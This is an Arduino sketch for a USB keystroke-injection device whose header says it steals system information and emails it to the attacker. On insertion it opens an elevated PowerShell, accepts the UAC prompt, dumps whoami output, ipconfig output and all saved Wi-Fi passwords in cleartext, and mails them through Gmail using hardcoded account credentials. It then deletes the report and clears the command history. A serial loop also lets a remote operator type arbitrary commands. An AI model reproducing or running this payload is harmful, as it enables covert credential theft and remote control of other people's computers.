/*
 * Created by ryspom, to get valuable system information and send it back to the attackers email.
 * It should work with windows 7, but it is only tested on windows 10 machines(works perfect!)
 */
#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void command(char command[])
{
  Keyboard.print(command);
  typeKey(KEY_RETURN);
}

void openWindowsMenu(){
  Keyboard.press(KEY_LEFT_CTRL);
  delay(80);
  Keyboard.press(KEY_ESC);
  delay(80);
  Keyboard.releaseAll();
  delay(1000);  // wait for quick windows menu to load
}

void twoKeyCombination(char key1[],char key2[]){
  Keyboard.press(key1);
  delay(50);
  Keyboard.press(key2);
  delay(50);
  Keyboard.releaseAll();
}

void threeKeyCombination(char key1[],char key2[], char key3[]){
  Keyboard.press(key1);
  delay(50);
  Keyboard.press(key2);
  delay(50);
  Keyboard.press(key3);
  delay(50);
  Keyboard.releaseAll();
}

void moveWindowOffScreen(){
    //enter the window manipulation menu
    Keyboard.press(KEY_LEFT_ALT);
    delay(80);
    Keyboard.write(0x20);  // ascii code for space bar. Not a modifier key, so we use .write()
    delay(80);
    Keyboard.releaseAll();
  
    // choose M(stands for Move) and use arrows to move the CMD window off screen
    Keyboard.write('m');  // NOTE: there is no need for pressing the Return key. By pressing "M", the option is automatically selected
    delay(100);  // wait for the window to enter "move" mode
    Keyboard.press(KEY_LEFT_ARROW);  
    delay(4000);   //  we want enough delay for the window to go off screen
    Keyboard.releaseAll();
    typeKey(KEY_RETURN);
    delay(300);
}

void blinkLed(){
  digitalWrite(2,HIGH);
  delay(300);
  digitalWrite(2,LOW);
  delay(300);
}

/* Init function */
void setup()
{
  pinMode(A2, INPUT); // Added a pushbutton at pin A2(connected to GND with 10KOhm pulldown resistor and VCC)
  pinMode(2,OUTPUT);  // added a LED for output
  Serial1.begin(115200);  // Serial1 MUST be used(instead of Serial. This is a leonardo specific requirement)
  Serial.begin(115200);  // Debug Serial to be used from PC connected with usb cable
  
  if(digitalRead(A2)==LOW){  // if the key is pressed, the value is HIGH and the script doesnt run!
    // Begining the Keyboard stream
    Keyboard.begin();
    delay(2000);

    twoKeyCombination(KEY_LEFT_GUI,'r');  // open "run" dialog

    command("powershell Start-Process powershell -Verb runAs");
    
    delay(1500);  // wait for the powershell to open

    Keyboard.press(KEY_LEFT_ALT);  // reply yes to User Account Control Screen
    Keyboard.press('y');
    Keyboard.releaseAll();
    delay(300);
    typeKey(KEY_RETURN);
    delay(2000);  // wait untill the system recognises y is not a command, or until powershell opens

    //moveWindowOffScreen();

    command("$SMTPServer = 'smtp.gmail.com'");
    command("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)");
    command("$SMTPInfo.EnableSsl = $true");
    command("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('nickpap556', 'cB12c39#ni55billNiK');");
    command("$ReportEmail = New-Object System.Net.Mail.MailMessage");
    command("$ReportEmail.From = 'nickpap556@gmail.com'");
    command("$ReportEmail.To.Add('aellinitakis@isc.tuc.gr')");
    command("clear");
    twoKeyCombination(KEY_LEFT_ALT,KEY_F7);  // cmd and powershell history(commands) is erased with Alt+F7
    command("$ReportEmail.Subject = 'Duck Machine Report'");
    command("$ReportEmail.Body = 'Duck Email Successfully Sent from Rubber-Duckied PC!Check the attachments for system data/info.'");
    command("echo \"This is a file automatically generated on the target pc by the ducky script.\" > reportfile.txt");              // signle > because we do not want to append, we want to create the file
    command("echo \"whoami results:\" >> reportfile.txt");          
    command("whoami >> reportfile.txt");                        
    command("echo \"WIFI PASSWORDS!\" >> reportfile.txt");       
    command("(netsh wlan show profiles) | Select-String \"\\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$name\" key=clear)}  | Select-String \"Key Content\\W+\\:(.+)$\" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize >> reportfile.txt");                     
    //THE ABOVE ONE-LINER was found on https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---Data-Exfiltration---Backdoor
    command("echo \"ipconfig results\" >> reportfile.txt");         
    command("ipconfig >> reportfile.txt");                       
    command("$ReportEmail.Attachments.Add('reportfile.txt')");   // dump every useful info in that file and attach it to the email 
    command("$SMTPInfo.Send($ReportEmail)");
    command("del reportfile.txt");  // hide our tracks a bit, after powershell has exited -> email has been sent(can cause trouble)
    command("exit");
    Keyboard.end();
  }
}

/* Unused endless loop */
void loop(){
  blinkLed();
    if (Serial1.available() > 0) {
    String serialstring = Serial1.readString();
    String typeOfCommand = serialstring.substring(0,3);  // the first four letters indicate the type of the command(e.g. "wrt=")
    String commandContent = serialstring.substring(4);  // all the letters after the fourth
    char commandContentChar[commandContent.length()];
    Serial.println("----------------------New Command----------------------");
    Serial.print("serialstring=");
    Serial.println(serialstring);
    Serial.print("typeofcommand=");
    Serial.println(typeOfCommand);
    Serial.print("commandContent=");
    Serial.println(commandContent);
    Serial.print("commandContentChar=");
    Serial.println(commandContentChar);
    commandContent.toCharArray(commandContentChar,commandContent.length());
    if(typeOfCommand=="cmd"){       // command mode. Types a command and then presses the Return key
      Keyboard.print(commandContent);
      typeKey(KEY_RETURN);   
    }
    else if(typeOfCommand=="prt"){  // print mode. Just prints the output wherever the cursor's at.
      Keyboard.print(commandContent);
    }
    else if(typeOfCommand=="wrt"){  // write mode. Writes a single key, both a modifier and a letter/symbol one.
      Keyboard.write(commandContentChar);
    }
    else if(typeOfCommand=="prs"){  // press mode. Presses a modifier Key(and does not release it until an rls comes.
      Keyboard.press(commandContentChar);      
    }
    else if(typeOfCommand=="rls"){  // release mode. Releases all the pressed modifier keys.
      Keyboard.releaseAll();
    }
    else if(typeOfCommand=="dbg"){
      //do nothing. "dbg" stands for Debug and it is to be used for debug of the nodeMCU through an USB8
    }
    else{
      Keyboard.print(serialstring);
    }
    
    
  }
}
